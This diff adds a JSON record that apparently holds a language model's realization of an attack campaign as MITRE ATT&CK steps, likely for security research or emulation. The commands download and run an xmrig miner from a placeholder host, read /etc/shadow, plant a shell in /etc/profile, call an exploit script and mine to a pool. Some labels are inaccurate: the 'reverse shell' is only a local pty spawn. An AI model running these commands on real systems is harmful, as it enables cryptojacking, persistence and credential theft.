@@ -1,0 +1,99 @@
+{
+  "campaign_id": "C0045",
+  "model": "qwen2.5-coder:14b",
+  "sample": 2,
+  "temperature": 0.0,
+  "realizations": [
+    {
+      "technique_id": "T1588.002",
+      "mechanism": "download-xmrig-miner",
+      "command": "wget https://example.com/xmrig -O /tmp/xmrig",
+      "target": "actor.primary",
+      "parameters": {
+        "url": "https://example.com/xmrig",
+        "output_path": "/tmp/xmrig"
+      }
+    },
+    {
+      "technique_id": "T1190",
+      "mechanism": "exploit-cve-2023-48022",
+      "command": "python3 exploit.py -u http://target.primary:8080",
+      "target": "target.primary",
+      "parameters": {
+        "url": "http://target.primary:8080"
+      }
+    },
+    {
+      "technique_id": "T1059.006",
+      "mechanism": "python-pty-reverse-shell",
+      "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+      "target": "target.primary",
+      "parameters": {}
+    },
+    {
+      "technique_id": "T1546.004",
+      "mechanism": "modify-shell-config",
+      "command": "echo 'python3 -c \"import pty; pty.spawn(\\\"/bin/bash\\\")\"' >> /etc/profile",
+      "target": "target.primary",
+      "parameters": {
+        "config_path": "/etc/profile"
+      }
+    },
+    {
+      "technique_id": "T1068",
+      "mechanism": "download-privilege-escalation-payload",
+      "command": "wget https://example.com/escalate -O /tmp/escalate",
+      "target": "target.primary",
+      "parameters": {
+        "url": "https://example.com/escalate",
+        "output_path": "/tmp/escalate"
+      }
+    },
+    {
+      "technique_id": "T1027.013",
+      "mechanism": "base64-encode-python-code",
+      "command": "echo 'import base64; exec(base64.b64decode(b\"SGVsbG8gV29ybGQhIg==\").decode())' > /tmp/encoded.py",
+      "target": "target.primary",
+      "parameters": {
+        "output_path": "/tmp/encoded.py"
+      }
+    },
+    {
+      "technique_id": "T1003.008",
+      "mechanism": "steal-password-hashes",
+      "command": "cat /etc/shadow",
+      "target": "target.primary",
+      "parameters": {}
+    },
+    {
+      "technique_id": "T1016",
+      "mechanism": "dns-query-for-ip-discovery",
+      "command": "nslookup example.com",
+      "target": "target.primary",
+      "parameters": {
+        "domain": "example.com"
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "ingress-tool-transfer-xmrig",
+      "command": "wget https://example.com/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig",
+      "target": "target.primary",
+      "parameters": {
+        "url": "https://example.com/xmrig",
+        "output_path": "/tmp/xmrig"
+      }
+    },
+    {
+      "technique_id": "T1496.001",
+      "mechanism": "compute-hijacking-gpu-mining",
+      "command": "/tmp/xmrig --url stratum+tcp://pool.example.com:3333 --user my_wallet_address",
+      "target": "target.primary",
+      "parameters": {
+        "xmrig_path": "/tmp/xmrig",
+        "pool_url": "stratum+tcp://pool.example.com:3333",
+        "wallet_address": "my_wallet_address"
+      }
+    }
+  ]
+}
